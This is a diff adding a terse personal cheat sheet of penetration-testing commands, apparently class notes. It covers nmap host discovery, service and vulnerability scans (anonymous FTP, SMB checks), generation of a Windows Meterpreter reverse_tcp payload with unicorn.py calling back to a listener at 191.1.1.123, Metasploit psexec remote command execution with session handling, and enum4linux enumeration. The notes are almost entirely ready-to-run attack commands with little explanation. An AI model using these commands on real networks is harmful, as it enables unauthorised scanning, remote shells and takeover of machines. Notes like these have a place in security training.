@@ -1,0 +1,79 @@
+NMAP Commands to save time 
+
+# Find Printers with NMAP 
+
+nmap -O 172.16.127.0/24 -oG - | grep printer >> 127NetPrinter.csv 
+
+# Find LIVE Hosts 
+
+nmap -sP -oA Branches/230Network 172.16.230.0/24 
+
+
+====== Home ====== 
+
+Created Tuesday 07 April 2015 
+
+# find all hosts in the network 
+
+nmap -n -sn 172.16.124.0/24 -oA ping-sweep -v10 --stats-every 15s 
+
+
+# extract live hosts 
+
+awk '/Up/ {print $2}' ping-sweep.gnmap > live-hosts.txt 
+
+
+# find what services running on live hosts 
+
+nmap -iL live-hosts.txt -oA service-scan -v10 --stats-every 1m -sV 
+
+# scan if there is anonymous FTP service 
+
+# you can find all script at /usr/share/nmap/scripts folder 
+
+nmap -iL 21-open.txt -p21 --script ftp-anon -oA ftp-anon-scan -v10 --stats-every 30s 
+
+# check the smb vulnerability 
+
+nmap -iL 445-open.txt -p445 --script smb-check-vulns -oA smb-check-vulns -v10 --stats-every 30s 
+
+# Metaspoit framework - msfconsole 
+
+# Commands are based on your context 
+
+# Metesploit prompt 
+
+# 
+
+# The Materpreter Handler framework 
+
+# python unicorn.py payload reverse_ipaddr port 
+
+Example: python unicorn.py windows/meterpreter/reverse_tcp 192. 
+
+# the unicorn.py is saved at [[/root/class/unicorn]] fold 
+
+python unicorn.py windows/meterpreter/reverse_tcp 191.1.1.123 8450 
+
+
+# Metesploit 
+
+msfconsole 
+
+resource /root/class/unicorn/unicorn.rc 
+
+search psexec_command 
+
+use auxiliary/admin/smb/psexec_command 
+
+# set command like COMMAND, SMBUser,  
+
+run 
+
+sessions 
+
+sessions -i 1 
+
+https://labs.portcullis.co.uk/tools/enum4linux/ 
+
+enum4linux.pl -a 192.168.2.55 
